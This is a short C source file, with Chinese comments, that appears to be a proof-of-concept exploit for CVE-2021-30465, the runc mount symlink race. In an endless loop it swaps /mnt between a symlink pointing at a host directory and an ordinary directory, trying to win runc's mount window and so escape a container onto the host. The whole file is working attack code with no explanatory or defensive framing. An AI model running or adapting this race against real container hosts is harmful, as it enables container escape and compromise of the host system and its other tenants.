// exploit.c - CVE-2021-30465 修复版
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

int main() {
    const char *target_dir = "/host/tmp/cve_poc_target";
    const char *mount_point = "/mnt";

    printf("[*] 竞争程序已启动，正在切换符号链接...\n");

    while (1) {
        // 1. 尝试删除旧路径并建立指向宿主机的符号链接
        unlink(mount_point); 
        rmdir(mount_point);
        if (symlink(target_dir, mount_point) != 0) {
            // 失败通常是因为路径已被 runc 占用，继续尝试
        }

        // 2. 极短延迟，尝试命中 runc 的挂载窗口
        // usleep(10);

        // 3. 恢复为普通目录，防止 runc 验证挂载点时报错退出
        unlink(mount_point);
        mkdir(mount_point, 0777); 
        
        // 再次微小延迟
        // usleep(10);
    }
    return 0;
}